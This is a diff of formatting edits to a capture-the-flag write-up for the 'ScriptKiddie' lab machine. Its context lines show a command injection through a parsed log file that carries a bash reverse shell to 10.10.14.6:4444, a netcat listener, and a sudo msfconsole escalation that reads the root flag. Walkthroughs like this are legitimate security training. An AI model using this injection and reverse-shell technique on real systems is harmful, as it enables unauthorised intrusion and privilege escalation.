@@ -220,8 +220,8 @@ Let's see what information the script gets from the file
 └─# cat logs | cut -d' ' -f3-
 789 123
 ```
-It takes everything after the second space and puts this in the ip variable
-We can inject something after the second space to try to escalete privileges
+It takes everything after the second space and puts this in the ip variable  
+We can inject something after the second space to try to escalete privileges  
 Lets test it
 ```
 ┌──(root💀kali)-[/home/…/Scan/Scan-results/ScriptKiddie/test]
@@ -251,7 +251,7 @@ Now we can inject reverse-shell command after the seccond space for privilege es
 ```
 kid@scriptkiddie:~/logs$ echo "1 1 ;/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.6/4444 0>&1';" > hackers
 ```
-And on the Kali side
+On the Kali side
 ```
 ┌──(root💀kali)-[/home/…/Scan/Scan-results/ScriptKiddie/ssh]
 └─# nc -lvp 4444                                                                                                                                                                      130 ⨯
@@ -298,8 +298,9 @@ sudo msfconsole
 + -- --=[ 7 evasion                                       ]
 
 Metasploit tip: Use help <command> to learn more about any command
+```
 
-
+```
 msf6 > cat /root/root.txt
 [*] exec: cat /root/root.txt
 
